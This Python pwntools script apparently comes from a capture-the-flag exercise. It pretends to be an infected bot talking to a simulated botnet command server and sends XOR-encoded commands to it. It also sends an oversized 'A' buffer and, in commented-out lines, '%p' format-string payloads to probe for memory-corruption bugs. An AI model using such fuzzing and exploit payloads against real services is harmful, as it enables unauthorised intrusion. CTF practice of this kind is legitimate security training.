from pwn import *
import platform
import time

# context.log_level = 'debug'

def xor_crypt_string(data, key='0202_NOCPRED', encode=False, decode=False):
    from itertools import izip, cycle
    import base64

    if decode:
        data = base64.decodestring(data)
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(data, cycle(key)))

    if encode:
        return base64.encodestring(xored).strip()
    return xored


print(xor_crypt_string('wwd\022\f\027\034\n\036\024\n'))

def send_message(conn, message, has_response=True, timeout = 0):
    time.sleep(timeout)
    conn.send(xor_crypt_string(message) + "\r\n\r\n")

    print("sent:", message)
    if has_response:
        response = conn.recv()
        print("received:", xor_crypt_string(response.strip()))


host = 'research.threatsims.com'
port = 50715

# conn = remote(host, 9000)
# response = conn.recv()
# port = response.split(' ')[-1]
fuzzer = remote(host, port, timeout=15)

uid = 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)'
uname = 'Linux dctf 4.4.0-138-generic #164-Ubuntu SMP Tue Oct 2 17:16:02 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux'
uptime = ' 19:05:55 up  3:05,  3 users,  load average: 0.09, 0.05, 0.01'

uuid = 'BHl72uuwcr9brnI1BCy'
# uuid = '%p'*500


def register(conn, uuid):
    send_message(conn, 'NEW ' + uuid)
    send_message(conn, 'INFO TheCovidBotNet', False)


# 526 - 1024
def alive(conn, uuid):
    send_message(fuzzer, 'ALIVE ' + uuid, timeout=0)
    send_message(fuzzer, 'PUSH ' + 'A' * (529-9))
    send_message(fuzzer, 'PUSH b')
    send_message(fuzzer, 'PUSH c', False)
    # send_message(fuzzer, 'PUSH ' + '%p' * 500, timeout=0)
    # send_message(fuzzer, 'PUSH ' + '%p' * 500, timeout=0)
    # send_message(fuzzer, 'PUSH ' + '%p' * 500, False, 0)


# register(fuzzer, uuid)
alive(fuzzer, uuid)

